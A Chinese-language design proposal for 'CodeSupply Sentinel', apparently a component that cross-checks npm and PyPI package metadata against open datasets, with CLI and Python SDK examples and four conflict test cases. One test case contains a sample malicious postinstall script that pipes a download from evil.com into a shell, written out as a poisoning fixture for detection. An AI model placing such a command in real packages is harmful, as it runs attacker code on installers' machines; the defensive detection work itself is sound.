## 1. 组件定位、技术增量与接入规范

### 1.1 组件定位：CodeSupply 聚合管线的独立质检组件

本项目设计为 **CodeSupply 跨生态元数据聚合管线中的独立质检与仲裁组件（Standalone Quality Assurance & Cross-Source Adjudication Sentinel）**。

在 NLnet CodeSupply 整体生态体系中，官方核心联盟（€3M 级别）负责大规模多源抓取、数据湖汇聚与主干管线运营；本组件**不重复造通用抓取轮子，不自建竞争性数据仓库**，而是作为可拔插的“质检哨兵”与“冲突裁判”接入聚合流：
- **位置**：置于 CodeSupply 原始数据抽取（Extract/Harvest）之后、权威主元数据写入（Consensus Store）之前。
- **职责**：针对进入管线的任意包版本（PURL），对来自官方源、第三方镜像源、安全审计快照等多源元数据进行微秒级到秒级的规范化对齐、时间序列冲突仲裁、制品物理一致性验证及生命周期异常侦测。

```
[CodeSupply 上游抽取 / 多源 Feed]
  (Official Registries / ClearlyDefined / deps.dev / OSV)
                        │
                        ▼  (输入: 聚合观测记录 Stream / Batch)
        ┌──────────────────────────────────────────────┐
        │   CodeSupply Sentinel (本独立质检组件)        │
        │  ──────────────────────────────────────────  │
        │  1. 跨源字段对齐层 (Cross-Source Aligner)      │
        │  2. 哈希强约束检验 (Artifact Hash Enforcer)   │
        │  3. 时间与证据仲裁引擎 (Adjudication Engine) │
        │  4. 生命周期与版本追踪 (Lifecycle Tracker)     │
        └──────────────────────────────────────────────┘
                        │
         分流输出 ──────┴───────┐
         ▼                      ▼
[实时校验结论产物]       [周期性质检快照数据集]
(Validation Verdict)    (Verified Dataset Snapshot)
  - 阻断真实篡改/投毒     - 列式 Parquet + JSONL
  - 标记同步延迟窗口       - 支持 DuckDB / 离线复跑
  - 解构语义差异映射       - 输出源数据质量评分卡 (M3)
  - 挂起不可判定证据
```

### 1.2 核心增量：带来源、时间与可复现证据的跨源判定与生命周期追踪

为避免学术包装与功能虚浮，本方案明确划分技术红线：
- **非创新项（彻底剔除/降级为底层库依赖）**：
  - 基础 Package URL (PURL) 字符串规范化与语法校验（直接复用官方 `packageurl-python` 与已有的 PURL 官方测试集）。
  - 单一注册表的普通存在性探测（AboutCode `purl-validator` 已有基础探测能力）。
  - 单一 SPDX 许可证合法性正则匹配（直接复用 AboutCode `license-expression`）。
- **真实技术增量（核心价值所在）**：
  1. **带时间维度的跨源状态仲裁**：引入“观测时间戳序列（Observation Timeline）”与“源权威性拓扑（Authority Graph）”，能够区分“真实数据篡改”与“分布式抓取节点的正常同步延迟（Replication Lag）”，避免将下游缓存未同步误报为安全事件。
  2. **带密码学与物理证据链的归因报告**：每一项冲突判定不仅给出布尔结论，更输出完整的反事实证据链条（包含对照源 URL、HTTP 响应快照哈希、Tarball/Wheel 物理检查指标、官方发布声明、签名凭据快照），支持第三方零依赖完全复现。
  3. **生命周期对抗性追踪**：捕获官方源与开放数据集之间的“隐蔽变更”——如幽灵撤回（Silent Unpublish / Yank）、历史哈希覆写（Mutation）、发布者凭据交割异动（Publisher Drift）以及预发布向正式版突变的语义漂移。

### 1.5 接入示例：CodeSupply 聚合方如何调用

#### 1.5.1 CLI 命令行接入示例

**场景 A：接入 Unix 标准流水线（流式质检过滤）**
```bash
# 从上游抓取管道读取多源数据，执行质检，将严重冲突拦截并导出审计报告
cat upstream_feed.jsonl \
  | codesupply-sentinel verify --mode stream --fail-on-critical \
  --output-clean clean_feed.jsonl \

```

**场景 B：单包即时仲裁（按 PURL 指定对照源）**
```bash
# 对指定包版本触发 PyPI 官方源与 deps.dev 对照源质检
codesupply-sentinel inspect "pkg:pypi/cryptography@42.0.5" \
  --sources "pypi_official,deps_dev" \
  --cache-dir /tmp/cs-cache \
  --format rich-table
```

**场景 C：离线数据快照复跑（M3 确定性验收）**
```bash
# 基于 M1/M2 保存的固定输入快照文件离线复跑，验证 100% 幂等一致性

```

#### 1.5.2 API / Python SDK 接入示例

提供轻量、低依赖的 Python 客户端 SDK，方便直接嵌入 CodeSupply 聚合 Worker：

```python
from codesupply_sentinel import SentinelAdjudicator, ValidationOptions
from codesupply_sentinel.models import PackageObservationBatch

# 1. 初始化质检仲裁器（注入规则配置与缓存适配器）
adjudicator = SentinelAdjudicator(
    options=ValidationOptions(
        allow_replication_lag_seconds=86400,  # 允许 24 小时同步窗口
        enforce_strict_hash=True,              # 强制相同制品+算法校验
        download_physical_artifacts=True       # 启用物理物料解包核验
    )
)

# 2. 在 CodeSupply Worker 中处理抓取批次
def process_codesupply_batch(raw_json_record: str):
    observation = PackageObservationBatch.model_validate_json(raw_json_record)
    
    # 3. 执行多源交叉质检与仲裁
    verdict_report = adjudicator.adjudicate(observation)
    
    if verdict_report.verdict == "FAIL" and verdict_report.conflict_class == "REAL_ERROR":
        # 发现真实数据篡改或投毒，阻断并告警
        log_security_alert(verdict_report.evidence_matrix)
        quarantine_queue.push(verdict_report.model_dump_json())
    elif verdict_report.verdict == "WARN" and verdict_report.conflict_class == "SYNC_DELAY":
        # 下游源延迟，允许入库并标记待重试
        staging_queue.push(verdict_report.model_dump_json(), retry_after_hours=2)
    else:
        # 校验通过或良性语义差异，放行主元数据仓库
        main_consensus_db.commit(verdict_report.normalized_consensus_record)
```

## 2. 生态锁定、多源对照与真实冲突样例设计

### 2.1 双生态与四对照源锁定

本轮严格收窄范围，锁定两个最大、最具代表性的开源包生态，每个生态绑定“**官方 Registry 原厂接口 ↔ 开放数据集**”双源对照：

| 生态 | 对照源 1（官方原厂接口） | 对照源 2（开放数据集 / 镜像基准） | 对照重点与互补价值 |
|---|---|---|---|
| **npm** | **npm Registry CouchDB API**<br>(`registry.npmjs.org/<pkg>`)<br>+ 官方 Tarball 下载流 | **ClearlyDefined API / Harvest 快照**<br>(`api.clearlydefined.io/definitions/...`) | - 官方源提供原作者声明、发布时间戳与发布者凭据；<br>- ClearlyDefined 提供静态代码扫码许可证提取与归档快照；<br>- 对照核心：声明 vs 扫描漂移、物理 Tarball 篡改。 |
| **PyPI** | **PyPI Warehouse API**<br>(`pypi.org/pypi/<pkg>/json` / PEP 691)<br>+ PEP 740 出处证明 | **deps.dev API (Open Source Insights)**<br>(`api.deps.dev/v3/systems/pypi/...`) | - 官方源提供 Wheel/sdist 元数据及 Sigstore 证明；<br>- deps.dev 提供全图谱依赖快照与许可证归一化；<br>- 对照核心：Wheel 构建物哈希一致性、Yank 撤回状态同步。 |

---

### 2.2 哈希比对硬约束（Hard Invariant: Same Artifact, Same Algorithm）

在供应链多源校验中，跨文件格式（例如误将 sdist `.tar.gz` 与 wheel `.whl` 比对）或跨算法截断比对是导致“假阳性告警（False Positive Storm）”的头号杀手。

**本方案将此提升为规则引擎的最高优先级硬约束**：

```
[哈希比对前置断言 Assertions]
  ├── 断言 1: 制品归一化标识相同 (Exact Artifact Identity Match)
  │    └── 文件名与格式后缀必须 100% 字符匹配 (e.g., pkg-1.0-py3-none-any.whl == pkg-1.0-py3-none-any.whl)
  │    └── 严禁: .tar.gz 对比 .whl / 源码压缩包对比发布二进制
  └── 断言 2: 哈希加密算法标识相同 (Exact Algorithm Match)
       └── 双方声明算法必须标准化映射后一致 (e.g., sha256 == sha256, sha512 == sha512)
       └── 严禁: sha1 对比 sha256 / 截断哈希推断

[异常处理逻辑]
  若输入违反上述断言:
    -> 严禁输出判定结论 FAIL / TAMPERED (严禁误判为安全攻击)
    -> 引擎抛出不可比错误状态: E_HASH_INCOMPARABLE
    -> 报告归类为: INDETERMINATE (无法判定) + 附带前置校验失败证据
```

### 2.3 四类真实冲突样例可运行设计

设计 4 个完全可构造、可重放的基准冲突用例，覆盖供应链质检的核心难点：

#### 样例 1：真实错误（Real Error / Data Corruption & Tampering）
- **场景描述**：npm 生态下，物理 Tarball 的 SHA-512 哈希与 Registry 官方元数据记录发生冲突，或内部解包 `package.json` 被植入未声明的高危生命周期外联脚本。
- **输入构造**：
  - `Source A (npm Registry API)`: 声明 `express-mock@1.0.1` 的 `dist.integrity` 为 `sha512-Alpha...`，`scripts` 为空。
  - `Source B (物理下载流)`: 实际拉取 `dist.tarball`，流式计算哈希得到 `sha512-Beta...`；解包内部文件发现存在 `scripts.postinstall = "curl -s http://evil.com/x | sh"`。
- **期望判定输出**：
  - `verdict`: `FAIL`
  - `conflict_class`: `REAL_ERROR`
  - `severity`: `CRITICAL`
  - `rule_id`: `RULE_INT_001_HASH_MISMATCH` & `RULE_DFT_001_METADATA_DRIFT`
- **判定依据字段与归因逻辑**：
  - 制品与算法对齐满足硬约束（同为 `express-mock-1.0.1.tgz` 的 `sha512`）。
  - 对比字段：`registry.dist.integrity` (`sha512-Alpha...`) $\neq$ `actual_stream.sha512` (`sha512-Beta...`)。
  - 归因：直接物理凭据违背，判定为镜像中间人攻击、存储损坏或恶意投毒，触发最高级阻断。

#### 样例 2：同步延迟（Replication Lag / Sync Delay）
- **场景描述**：PyPI 上游作者刚刚发布了一个安全补丁版本，官方 Registry 已就绪；但第三方开放数据集（如 deps.dev 或 ClearlyDefined）尚未完成抓取爬虫队列，返回 404 或仍将前一版本标注为 `latest`。
- **输入构造**：
  - `Source A (PyPI Warehouse API)`: `requests@2.32.0` 存在，`upload_time` = `2026-10-18T10:00:00Z`。当前仲裁时间 = `2026-10-18T11:00:00Z`（仅距发布 1 小时）。
  - `Source B (deps.dev API)`: `requests@2.32.0` 查询返回 `404 Not Found`，最后爬取刷新时间 `last_indexed` = `2026-10-18T09:30:00Z`。
- **期望判定输出**：
  - `verdict`: `WARN`
  - `conflict_class`: `SYNC_DELAY`
  - `severity`: `LOW`
  - `suggested_action`: `RETRY_AFTER_WINDOW`（附注：容忍窗口 24h）
- **判定依据字段与归因逻辑**：
  - 判定字段：`abs(current_time - SourceA.upload_time) = 3600s < REPLICATION_TOLERANCE_SECONDS (86400s)`。
  - 辅助字段：`SourceB.last_indexed < SourceA.upload_time`。
  - 归因：下游数据源的快照时间早于上游发布时间，且处于合理同步延迟窗口期，判定为无害的同步延迟，不计为源故障，不阻断正常流水线。

#### 样例 3：语义差异（Semantic Divergence / Schema Mismatch）
- **场景描述**：PyPI 官方元数据中作者填写的许可证字段为非标准文本，而 ClearlyDefined 经过 ScanCode 工具扫描抽取出了规范的 SPDX 标识符。
- **输入构造**：
  - `Source A (PyPI API)`: `info.license` = `"Apache 2.0 and MIT"`（自由文本声明）。
  - `Source B (ClearlyDefined Harvest)`: `licensed.declared` = `"NOASSERTION"`, `licensed.discovered.expressions` = `["Apache-2.0", "MIT"]`（经代码树扫描提取）。
- **期望判定输出**：
  - `verdict`: `PASS_WITH_NORMALIZATION`
  - `conflict_class`: `SEMANTIC_DIVERGENCE`
  - `severity`: `INFO`
  - `mapping_result`: `{ "canonical_spdx": "Apache-2.0 AND MIT", "mapping_path": "DISCOVERED_SUPERSEDES_DECLARED" }`
- **判定依据字段与归因逻辑**：
  - 判定字段：`SourceA.license_type == 'author_declared'` 对比 `SourceB.license_type == 'tool_discovered'`。
  - 归因：两源非事实性黑白矛盾，而是“作者非标声明”与“自动化工具深度挖掘”之间的规范化粒度差异。质检器产出双源映射对照矩阵，将其归一化为合法 SPDX 2.3 表达式，记为语义差异。

#### 样例 4：无法判定（Indeterminate / Ambiguity）
- **场景描述**：历史久远的冷门包发生元数据矛盾，官方源返回 `yanked`（已撤回但未保留理由），第三方开放源保留了历史版本元数据但无哈希；原下载链接均已 404，且两端均无 Sigstore / SLSA 密码学签名证明。
- **输入构造**：
  - `Source A (PyPI API)`: `pkg:pypi/legacy-tool@0.5.0` 标记 `yanked: true`, `yanked_reason: null`，所有 `urls` 列表为空（已被物理擦除）。
  - `Source B (第三方快照)`: 记录 `version: 0.5.0`, `dependencies: ["urllib3<1.0"]`，但缺失 `hashes` 记录。
  - 双方均无 Sigstore Attestation，无 Git Commit 追溯哈希。
- **期望判定输出**：
  - `verdict`: `INDETERMINATE`
  - `conflict_class`: `INDETERMINATE`
  - `severity`: `MEDIUM`
  - `action_recommendation`: `MANUAL_AUDIT_REQUIRED`
- **判定依据字段与归因逻辑**：
  - 判定字段：`artifacts.available == false` 且 `signatures.present == false` 且 `source_records.conflicting == true`。
  - 归因：既无法取得物理制品验证哈希，又缺乏受信任的第三方密码学公钥签名链条，在确定性原则下无法单凭任何一方的无签名元数据推断真相，故明确裁决为“无法判定”，挂起交由人工或二级安全系统复核。
